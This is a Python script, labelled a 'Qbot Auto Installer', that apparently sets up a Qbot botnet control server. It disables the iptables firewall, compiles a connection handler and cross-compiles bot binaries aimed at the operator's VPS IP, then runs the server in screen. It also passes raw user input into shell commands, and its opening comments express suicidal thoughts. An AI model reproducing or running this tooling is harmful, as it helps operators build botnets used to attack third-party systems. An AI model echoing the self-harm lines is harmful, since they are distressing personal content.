import subprocess,os,sys,random,time,urllib2,subprocess
#!/usr/bin/env python

# id take my own life if it was easy... i would i honestly put the gun to my head
# ill pull the trigger myself and hope for everyone to be happy that im finally gone
# not in anyones way, not causing anymore trouble to my parents...
# i kno everyone hates me for who i am...
# Qbot Auto Installer
# Made By Ameity

def run(cmd):
    subprocess.call(cmd, shell=True)

print("\x1b[1;34m[\x1b[1;34mMade By Ameity\x1b[1;34m]| Qbot Installer\x1b[0m")
print("\x1b[1;34mHave Your Server IP Ready !\x1b[0m")
time.sleep(5)
time.sleep(5)
print("\x1b[1;37mInstalling Dependicies Please Wait\x1b[0m")
run("yum install gcc screen nano httpd python perl -y; ulimit -n 99999")
run("iptables -F; service iptables stop")
print("\x1b[1;34m--------------------------\x1b[0m")
print("\x1b[1;34mInstalled Dependencies\x1b[0m")
time.sleep(5)
print("\x1b[1;34mMake Your Login\x1b[0m")
time.sleep(5)
run("nano login.txt")
time.sleep(5)
time.sleep(5)
print("\x1b[1;34mLogin Succesfully Made\x1b[0m")
time.sleep(5)
print("\x1b[1;34m--------------------------\x1b[0m")
run("gcc -o server voidserver.c -pthread")
print("\x1b[1;37mNO \x1b[0;31mERRORS\x1b[1;37m?\x1b[0m")
print("\x1b[1;34mNOW THAT WE COMPILED OUR CONNECTION HANDLER\x1b[0m")
print("\x1b[1;34m Qbot BINARYS\x1b[0m")
print("\x1b[1;34m--------------------------\x1b[0m")
time.sleep(5)
time.sleep(5)
time.sleep(5)
print("\x1b[1;34mPlease wait\x1b[0m")
time.sleep(5)
print("\x1b[0;37mIts Gonna Ask You To Enter Option 1 And Enter\x1b[0m")
time.sleep(5)
print("\x1b[0;31mIts Gonna Ask You To Enter Option 1 And Enter\x1b[0m")
time.sleep(5)
print("\x1b[0;34mIts Gonna Ask You To Enter Option 1 And Enter\x1b[0m")
option = input ("Enter Option: ")
if option == 1:
	print ("\x1b[1;34mCompling Archs")
	time.sleep(2)
extra = raw_input("\x1b[0;37mTYPE python: ")
never = raw_input("\x1b[0;37mTYPE cc7.py: ")
dies = raw_input("\x1b[0;37mTYPE voidclient.c: ")
hanasu = raw_input("\x1b[0;37mVPS IP HERE: ");
run (""+extra+" "+never+" "+dies+" "+hanasu+"")
time.sleep(5)
time.sleep(5)
print("\x1b[0;37mScreening Your Server Skids\x1b[0m")
time.sleep(5)
run("pkill screen")
run("ulimit -n 999999")
run("iptables -F")
run("screen ./server 666 850 1")